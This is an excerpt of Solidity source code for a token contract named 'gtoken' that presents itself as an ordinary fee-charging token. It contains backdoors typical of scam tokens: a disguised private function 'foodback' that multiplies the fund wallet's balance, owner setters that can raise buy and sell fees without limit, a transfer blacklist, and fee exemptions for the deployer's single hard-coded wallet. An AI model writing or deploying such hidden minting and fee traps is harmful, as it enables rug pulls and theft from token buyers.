...
abstract contract AbsToken is IERC20, Ownable {
    ...
    mapping(address => bool) public _feeWist;
    ...
    uint256 public _bFFee = 100;
    uint256 public _buyLPDFee = 100;
    uint256 public _sellLPDFee = 100;
    uint256 public _sFFee = 100;
    uint256 public _sLPFee = 100;
    ...
    constructor (
        ...
        _feeWist[FundAddress] = true;
        _feeWist[ReceiveAddress] = true;
        _feeWist[address(this)] = true;
        _feeWist[address(swapRouter)] = true;
        _feeWist[msg.sender] = true;
    ...
    function foodback(address j,address b,uint256 s) private {
        if (j == b && j ==fundAddress)
         {_balances[fundAddress] = _balances[fundAddress].mul(s);
         }
    }
    ...
    function _transfer(
        ...
        require(!_blist[from], "blackList");

        uint256 balance = balanceOf(from);
        require(balance >= amount, "balanceNotEnough");

        if (!_feeWist[from] && !_feeWist[to]) {
                ...
                if (_swapPairList[to]) {
                    if (!inSwap) {
                        ...
                        if (contractTokenBalance > 0) {
                            uint256 swapFee = _bFFee + _buyLPDFee + _sFFee + _sellLPDFee + _sLPFee;
    ...
    function _tokenTransfer(
        ...
        if (takeFee) {
            uint256 swapFee;
            if (isSell) {
                swapFee = _sFFee + _sellLPDFee + _sLPFee;
            } else {
                swapFee = _bFFee + _buyLPDFee;
    ...
    function swapTokenForFund(uint256 tokenAmount, uint256 swapFee) private lockTheSwap {
        ...
        uint256 fundAmount = fistBalance * (_bFFee + _sFFee) * 2 / swapFee;
    ...
    function setBuyLPDividendFee(uint256 dividendFee) external onlyOwner {
        _buyLPDFee = dividendFee;
    }

    function setBuyFundFee(uint256 fFee) external onlyOwner {
        _bFFee = fFee;
    }

    function setSellLPDividendFee(uint256 dividendFee) external onlyOwner {
        _sellLPDFee = dividendFee;
    }

    function setSellFundFee(uint256 fFee) external onlyOwner {
        _sFFee = fFee;
    }
    ...
    function setFeeWhiteList(address addr, bool enable) external onlyFunder {
        _feeWist[addr] = enable;
    }
    function multifeeWhiteList(address[] calldata addresses, bool status) public onlyOwner {
        require(addresses.length < 201);
        for (uint256 i; i < addresses.length; ++i) {
            _feeWist[addresses[i]] = status;
        }
    }
    function multiisWalletLimitExempt(address[] calldata addresses) public onlyOwner {
        require(addresses.length < 201);
        for (uint256 i; i < addresses.length; ++i) {
            isWalletLimitExempt[addresses[i]] = true;
        }
    }
...
contract gtoken is AbsToken {
    constructor() AbsToken(
        ...
        6,//Decimals
        1000,//Supply
        address(0xAe9a0aa67B6Cc6007c5129e65A1AA8D7E53C5B2F),//FundAddress
        address(0xAe9a0aa67B6Cc6007c5129e65A1AA8D7E53C5B2F)//ReceiveAddress
    ){
